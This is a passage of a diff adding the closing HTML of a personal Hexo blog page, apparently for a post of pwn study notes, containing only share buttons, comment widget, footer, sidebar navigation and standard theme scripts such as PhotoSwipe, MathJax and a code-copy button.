+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://brocademaple.github.io/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CS-Notes/" rel="tag">CS Notes</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2024/09/21/CS_Notes/AI/%E3%80%90%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BA%94%E7%94%A8%E3%80%91240922%E5%86%85%E5%AE%B9%E5%88%86%E4%BA%AB/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">【大模型应用】240922内容分享</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2024
+        <i class="ri-heart-fill heart_icon"></i> brocademaple
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer.png" alt="私の宝庫です"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/aboutMe">自分</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+ <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js"></script>
+<script src="https://cdn.staticfile.org/mathjax/2.7.7/config/TeX-AMS-MML_HTMLorMML-full.js"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true,
+  };
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=1983763439&auto=1&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
